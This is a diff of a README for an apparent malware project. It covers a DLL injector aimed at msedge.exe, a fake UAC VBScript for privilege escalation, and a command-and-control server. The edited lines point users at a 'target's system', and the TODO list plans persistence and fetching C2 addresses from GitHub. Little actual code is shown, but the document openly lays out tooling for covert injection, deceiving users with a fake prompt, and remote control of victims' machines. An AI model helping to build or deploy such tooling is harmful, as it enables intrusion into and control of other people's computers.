@@ -12,11 +12,11 @@
    - Contains Injector.exe and main.cpp (source code of Injector.exe)
    - The Injector injects to the process msedge.exe
      - auto process = "msedge.exe";<br>
-       Change the process according to your wish and it accepts DLLs
+       Change the process according to your wish and make sure the process accepts DLLs
    - The Injector.exe's source code specify the complete path of Repair.dll
      - Complete path of the DLL should be specified to be injected by the Injector
        - const char* dllPath = "D:/Programming/C++/High_Shellcode_with_SE/DLL/Repair.dll";<br>
-         Change the path to the dll according to yours
+         Change the path to the dll in your system or target's system with some code modification
 
 3. <b>PrivEscalationVBScript</b>
    - Contains FAKE_UAC.vbs, VBSRepair.dll and main.cpp (modified source code of Repair.dll)
@@ -26,6 +26,7 @@
 
 # TODO:
 - Implement persistence for all the exe
+- Implement function for the DLL to search Repair.dll in the computer and <br>check whether is it valid using checksum
 - Create a C++ executable to execute the VB Script
 - Implement some error handling for the DLL source code
 - Implement a feature to check a specified GitHub file for what server IP and Port it should be used<br>to connect to the C2 server
